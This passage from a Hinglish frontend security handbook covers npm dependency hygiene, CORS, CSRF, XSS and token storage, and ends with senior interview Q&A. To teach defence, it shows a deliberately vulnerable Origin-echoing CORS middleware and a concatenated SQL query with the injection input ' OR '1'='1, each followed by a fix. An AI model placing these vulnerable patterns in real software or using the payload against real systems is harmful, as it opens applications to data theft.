- **Lockfiles commit karo** (`package-lock.json`, `pnpm-lock.yaml`) — taaki exact same dependency tree reproduce ho har environment mein, aur koi unexpected transitive dependency upgrade silently na aa jaaye.

```bash
# CI pipeline mein automated check add karo — koi high/critical vulnerability merge hone se pehle catch ho
npm audit --audit-level=high
# ye command exit code non-zero return karega agar high/critical severity vuln mile
# CI iske basis pe build fail kar sakta hai, PR ko merge hone se rok sakta hai
```

- **Supply chain attacks awareness** — real-world incidents jaise `event-stream` (2018, malicious code inject hua ek popular package ke transitive dependency mein, targeting crypto wallets) ya typosquatting packages (jaise `reactt` ya `loadash` — legit package names ke misspelled clones jo malicious code contain karte hain) dikhate hain ki dependency trust blindly nahi diya ja sakta. Package install karne se pehle download counts, last publish date, aur maintainer reputation check karna ek reasonable habit hai, especially kam-known packages ke liye.

**Senior mindset — "do I actually need this package?"** Ek chhoti utility ke liye jo tum khud 10 lines mein likh sakte ho (e.g. simple string formatting, basic array dedup), poora npm package add karna generally **not** worth the risk hai. Har additional dependency:

- Attack surface badhata hai (ek compromised package, jaise real-world `event-stream` ya `ua-parser-js` incidents mein hua, tumhare app ko directly compromise kar sakta hai)
- Bundle size badhata hai
- Maintenance burden badhata hai (unmaintained packages, breaking changes)

Senior developer ka default question hone chahiye: "Is ye package genuinely complex enough problem solve kar raha hai ki mujhe kisi stranger ke code pe trust karna justified hai?"

---

## 8. Real-World Gotchas {#gotchas}

- **Client-side validation ko ONLY validation samajhna** — client-side checks (form validation, disabled buttons, JS-based checks) sirf UX ke liye hoti hain, **kabhi bhi security boundary nahi**. Attacker directly API ko curl/Postman se call kar sakta hai, bypass karke saari client-side logic. **Server ko har request re-validate karna hi padega**, chahe client ne "already validated" data bheja ho. Ye exactly wahi lesson hai jo RN companion handbook mein payment signature verification ke context mein tha — **client ko kabhi trust mat karo**, chahe wo mobile app ho ya web frontend.

- **API keys/secrets ko frontend code mein daalna, ye sochte hue ki `.env` unhe hide kar dega** — koi bhi value jo tum client-side JS bundle mein include karte ho (chahe `.env` file se aaya ho build time pe), **fully visible** hai kisi ko bhi jo DevTools kholta hai (Network tab, ya bundled JS file directly download kar ke). Ye exact wahi `EXPO_PUBLIC_` lesson hai jo RN handbook mein tha — koi bhi env variable jo "public"/"client-exposed" prefix ke saath marked hai (Next.js mein `NEXT_PUBLIC_`, Vite mein `VITE_`, CRA mein `REACT_APP_`), assume karo ki ye **publicly readable** hai. Genuinely secret keys (database passwords, private API keys, signing secrets) **kabhi** frontend bundle mein nahi jaani chahiye — unhe server-side hi rehna chahiye.

- **`Access-Control-Allow-Origin: *` ko `Access-Control-Allow-Credentials: true` ke saath combine karna** — ye ek real, exploitable misconfiguration hai. Agar server credentials (cookies) allow karta hai cross-origin requests mein, **koi bhi** origin se aane wali requests allow karna (`*`) matlab **koi bhi malicious site** authenticated requests bhej sakta hai user ki cookies ke saath aur response bhi read kar sakta hai. Browsers actually is exact combination ko reject karte hain spec ke level pe — `*` ke saath credentials allowed nahi hote — lekin developers isko "fix" karne ke liye ek dangerous pattern likh dete hain:

```js
// DANGEROUS misconfiguration — ye "*" wildcard rule ko bypass karne ki koshish hai
app.use((req, res, next) => {
  // request ke Origin header ko blindly echo kar diya, koi whitelist check nahi
  res.setHeader("Access-Control-Allow-Origin", req.headers.origin);
  // credentials bhi allow kar diye — ab EFFECTIVELY har origin allowed hai, credentials ke saath
  res.setHeader("Access-Control-Allow-Credentials", "true");
  next();
});
// yahan koi validation nahi hai ki req.headers.origin ek trusted origin hai ya nahi
// isliye evil.com se aayi request ko bhi "Access-Control-Allow-Origin: evil.com" mil jaayega
```

```js
// SAFE fix — origin ko explicit whitelist ke against validate karo
const allowedOrigins = ["https://app.example.com", "https://admin.example.com"];
// sirf ye specific, trusted origins allowed hain

app.use((req, res, next) => {
  // request ka origin nikalo
  const origin = req.headers.origin;
  // check karo ki ye whitelist mein hai ya nahi, tab hi echo karo
  if (allowedOrigins.includes(origin)) {
    // sirf tab header set karo jab origin whitelist mein match kare
    res.setHeader("Access-Control-Allow-Origin", origin);
    res.setHeader("Access-Control-Allow-Credentials", "true");
  }
  next();
});
```

Ye ek bahut common real-world mistake hai — developer CORS error fix karne ki koshish karte waqt "Origin header ko echo karo" pattern copy-paste kar leta hai bina samjhe ki isse effectively wildcard-with-credentials jaisa hi dangerous behavior create ho gaya, sirf technically spec violation na hote hue.

- **SQL Injection awareness (brief, mostly backend concern)** — agar tum full-stack app bana rahe ho aur khud API routes likh rahe ho, user input ko directly SQL query string mein concatenate karna **kabhi mat karo**:

```js
// VULNERABLE — user input directly query string mein concatenate kiya
const query = `SELECT * FROM users WHERE email = '${userInput}'`;
// attacker userInput mein daal sakta hai: ' OR '1'='1
// resulting query: SELECT * FROM users WHERE email = '' OR '1'='1'
// ye saare users return kar dega, intended single user ki jagah
```

```js
// SAFE — parameterized query use karo, jahan driver value ko properly escape karta hai
const query = "SELECT * FROM users WHERE email = ?";
db.query(query, [userInput]);
// userInput yahan hamesha "data" ki tarah treat hota hai, kabhi "code" ki tarah nahi
```

Frontend developers jo full-stack apps banate hain unhe ye awareness honi chahiye, chahe ye primarily backend/database layer ka concern ho.

---

## Key Takeaways {#key-takeaways}

- **XSS** teen types mein aata hai — Stored (DB mein saved), Reflected (URL/request se bounce hota hai), DOM-based (purely client-side JS ka innerHTML issue). Sabka fix same principle hai: untrusted data ko kabhi unescaped HTML ki tarah render mat karo.
- **React JSX (`{value}`) by default XSS-safe hai** kyunki wo values ko text node ki tarah render karta hai, HTML ki tarah nahi. `dangerouslySetInnerHTML` explicitly is protection se opt-out karta hai — isko avoid karo, ya sirf DOMPurify se sanitize karke use karo.
- **CSRF** exploit karta hai ki cookies domain-scoped hoti hain, origin-scoped nahi — malicious site tumhari authenticated session ka misuse kar sakti hai. Defense: `SameSite=Strict/Lax` cookies (primary, browser-level), CSRF tokens (defense-in-depth, especially sensitive actions ke liye).
- **CORS koi vulnerability nahi hai** — ye browser-enforced Same-Origin Policy hai jo users ko protect karti hai. CORS errors sirf **server-side** fix hote hain (`Access-Control-Allow-Origin` header), kabhi client-side nahi.
- **CSP** defense-in-depth provide karta hai XSS ke against — browser level pe control karta hai konse sources se scripts/styles/images load ho sakte hain, chahe injection ho bhi jaaye.
- **Token storage:** `localStorage` XSS se fully exposed hai (koi bhi JS read kar sakta hai), `httpOnly` cookies JS se completely hidden hain but CSRF exposure laate hain. Same-site apps ke liye httpOnly cookies + SameSite + CSRF tokens generally safer default hai.
- **Dependencies** aaj-kal sabse common attack vector hain — `npm audit`, Dependabot/Renovate, aur unnecessary packages avoid karna basic hygiene hai.
- **Client ko kabhi trust mat karo** — validation, secrets, sab kuch server-side hi enforce hona chahiye. Frontend "public" env vars genuinely public hote hain, chahe naam mein `.env` ho.

---

## 🎯 Interview Questions — Senior Frontend Developer {#interview-questions}

**Q1. XSS ke teen types explain karo — Stored, Reflected, aur DOM-based — aur batao inmein core difference kya hai.**

A: Teenon mein core commonality hai attacker ka JS victim ke browser mein, tumhare origin ke context mein execute hona. Difference hai **payload kahan se aata hai aur kahan tak travel karta hai**: Stored XSS mein payload database mein save hota hai (e.g. comment field) aur **har visitor** ko serve hota hai jo tab tak persist rehta hai jab tak clean na ho. Reflected XSS mein payload request ka part hota hai (URL query param) aur server usse unescaped response mein "echo" kar deta hai — sirf ek single request-response cycle mein exist karta hai, aur target-specific hota hai (attacker ko victim se malicious link click karwana padta hai). DOM-based XSS mein server involved hi nahi hota — vulnerability purely client-side JS mein hoti hai jo untrusted data (jaise `location.hash`) ko unsafely `innerHTML` jaisi API mein daal deti hai.

**Q2. React apps by default XSS se protected kyun hain? `dangerouslySetInnerHTML` ka naam itna scary kyun rakha gaya?**

A: React jab JSX expression `{value}` render karta hai, wo value ko DOM text node ki tarah set karta hai, na ki HTML ki tarah parse karke. Text nodes browser dwara literal characters ki tarah treat hote hain — koi HTML parsing nahi hoti unke upar, isliye embedded `<script>` tags execute nahi hote, sirf text ki tarah dikhte hain. `dangerouslySetInnerHTML` explicitly is default protection se opt-out karta hai — ye directly `innerHTML` set karta hai, jisse browser actual HTML parse karega including any embedded scripts/handlers. Naam deliberately scary rakha gaya hai taaki developer/reviewer turant flag kare ki "yahan sanitization hui hai kya?" — ye API design ke through ek safety signal hai.

**Q3. CSRF attack kaise kaam karta hai step by step, aur SameSite cookies isko kaise solve karte hain?**

A: User `bank.com` pe login karta hai, session cookie set hoti hai. User phir `evil.com` visit karta hai jahan hidden auto-submitting form hota hai jo `bank.com/transfer` ko POST karta hai. Browser automatically `bank.com` ki cookies attach karta hai is cross-site request ke saath (kyunki cookies domain-scoped hain), toh server ko valid authenticated request dikhti hai, chahe wo actually `evil.com` se initiated hui thi. `SameSite=Strict` ya `Lax` set karne se, browser cookie ko cross-site context mein request ke saath attach hi nahi karta — isliye server ko koi session milta hi nahi, aur request unauthenticated ki tarah fail ho jaati hai. Yehi is attack ko largely browser level pe solve kar deta hai.

**Q4. Ek naya developer console mein CORS error dekh ke poochta hai "ise client side pe kaise fix karoon?" — unhe kya samjhaoge?**

A: Ye ek fundamental misunderstanding hai — CORS error ka matlab hai server ne current frontend origin ko explicitly permission nahi di response read karne ki. Ye koi client-side bug nahi hai jo fix karna hai, balki ye Same-Origin Policy ka **intentional** enforcement hai jo users ko protect karta hai (taaki koi malicious site silently authenticated APIs call na kar sake). Fix **hamesha server-side** hota hai — server ko `Access-Control-Allow-Origin` header add karna hoga jisme correct origin (ya legitimately `*` non-credentialed public APIs ke liye) specify ho. Client-side koi trick, header, ya workaround CORS ko bypass nahi kar sakta — aur ye good thing hai, kyunki isse security guarantee compromise ho jaayega.

**Q5. Preflight request kya hoti hai aur ye kab trigger hoti hai?**

A: Preflight ek automatic `OPTIONS` request hai jo browser khud bhejta hai actual request se pehle, jab request "non-simple" ho — jaise `Content-Type: application/json` ke saath koi POST, ya custom headers jaise `Authorization` include karne wali request. Preflight server se poochti hai "agar main ye actual method/headers ke saath request bhejoon, kya allowed hoga?" Server `Access-Control-Allow-Methods`, `Access-Control-Allow-Headers`, aur `Access-Control-Allow-Origin` headers ke saath jawab deta hai. Sirf successful preflight ke baad hi browser actual request bhejta hai. Ye extra round-trip add karta hai, jise `Access-Control-Max-Age` header se cache kiya ja sakta hai.

**Q6. localStorage aur httpOnly cookies mein token store karne ka trade-off explain karo. Tum kaunsa recommend karoge aur kab?**

A: `localStorage` mein token store karna simple hai aur cross-origin API calls ke liye convenient, but iska bada risk ye hai ki **koi bhi JavaScript** (including attacker ka XSS-injected code) directly `localStorage.getItem()` se token read kar sakta hai — chahe token khud kabhi directly use na ho, agar site pe **kahin bhi** XSS vulnerability hai, token steal ho sakta hai. `httpOnly` cookies mein JavaScript **kabhi** cookie read nahi kar sakti, XSS ho ke bhi nahi — but ab CSRF ka exposure aata hai (cookie automatically attach hoti hai cross-site requests mein bhi), jisko `SameSite` attribute aur CSRF tokens se mitigate karna padta hai. Same-site traditional apps ke liye main httpOnly + SameSite + CSRF token combination recommend karoonga, kyunki XSS bahut common hai aur token theft ka blast radius generally CSRF se worse hota hai. Genuinely cross-origin architectures mein localStorage justify ho sakta hai, but tab XSS defense extra rigorously implement karna zaroori hai.

**Q7. Client-side form validation ko security measure samajhna kyun galat hai? Real risk kya hai?**

A: Client-side validation (required fields, regex checks, disabled submit buttons) **hamesha bypass-able** hai — attacker directly API endpoint ko curl, Postman, ya browser DevTools se call kar sakta hai, bina kisi client-side JS ko involve kiye. Isliye client-side validation sirf UX improvement hai (immediate feedback, better experience) — ye kabhi **security boundary** nahi hai. Server ko har incoming request **independently** validate karna hi hoga — assume karke ki request kisi bhi source se aa sakti hai, bina client-side checks pass kiye. Ye same principle hai jo backend payment verification mein critical hai — server-side signature/amount re-verification, client ke bheje data pe trust nahi.

**Q8. `EXPO_PUBLIC_` (RN) ya `NEXT_PUBLIC_`/`VITE_` (web) prefix wale environment variables ke baare mein developers ki sabse common galatfehmi kya hoti hai?**

A: Common misconception ye hai ki `.env` file mein value rakhne se wo "hidden" ya "secret" ho jaati hai. Reality ye hai ki jo bhi env variable build tool ko explicitly "client-exposed" mark kiya jaata hai (`NEXT_PUBLIC_`, `VITE_`, `EXPO_PUBLIC_` prefix), uski value **build time pe bundle mein directly embed** ho jaati hai — ye literally us JS file ke text mein present hoti hai jo browser/app download karta hai. Koi bhi user DevTools ke Network/Sources tab se, ya bundled file directly download karke, ye value plain text mein dekh sakta hai. Isliye genuinely sensitive secrets (private API keys, database credentials, signing secrets) kabhi bhi "public" prefixed env vars mein nahi jaani chahiye — unhe server-side hi rehna chahiye, kabhi client bundle mein compile nahi hona chahiye.

**Q9. `Access-Control-Allow-Origin: *` ke saath `Access-Control-Allow-Credentials: true` combine karna kyun dangerous hota hai?**

A: `Access-Control-Allow-Origin: *` matlab **koi bhi origin** response read kar sakta hai. Agar iske saath credentials (cookies) bhi allow ho (`Access-Control-Allow-Credentials: true`), toh effectively koi bhi malicious site tumhare API ko authenticated request bhej sakti hai (user ki cookies ke saath, jaise CSRF scenario) **aur** response bhi read kar sakti hai JavaScript mein — jo XSS-level data exposure create kar deta hai bina kisi injection ki zaroorat. Browsers actually spec level pe ye exact combination (`*` + credentials) reject karte hain safety ke liye — lekin misconfiguration jahan server dynamically request ke `Origin` header ko echo kar deta hai bina proper whitelist validation ke (effectively "accept any origin"), same practical vulnerability create karta hai.

**Q10. Ek company mein tumhe pata chalta hai ki ek npm dependency mein critical vulnerability hai jo `npm audit` ne flag ki hai. Tum is situation ko kaise handle karoge, aur aage is tarah ke incidents ko kaise prevent karoge?**

A: Immediate step: `npm audit` ka detailed output dekho — kaunsi dependency, kaunsa severity level, aur kya koi patched version available hai (`npm audit fix` try karo pehle). Agar direct fix available nahi hai (transitive dependency ka issue ho sakta hai), dependency tree check karo (`npm ls <package>`) ki kaun sa direct dependency isko pull kar raha hai, aur dekho ki koi alternative version ya package available hai. Agar vulnerability actively exploitable hai production mein (e.g. RCE, ya data exposure jo tumhara app ke usage pattern mein trigger ho sakta hai), isse priority patch ki tarah treat karo, na ki regular backlog item ki tarah. Prevention ke liye: Dependabot/Renovate enable karo taaki security patches automatically PR ki tarah aate rahein bina manual tracking ke; regular `npm audit` CI pipeline mein integrate karo taaki naye vulnerabilities merge hone se pehle hi flag ho jaayein; aur team culture mein "do we really need this package" mindset promote karo, taaki dependency count minimal rahe aur attack surface chhota rahe.
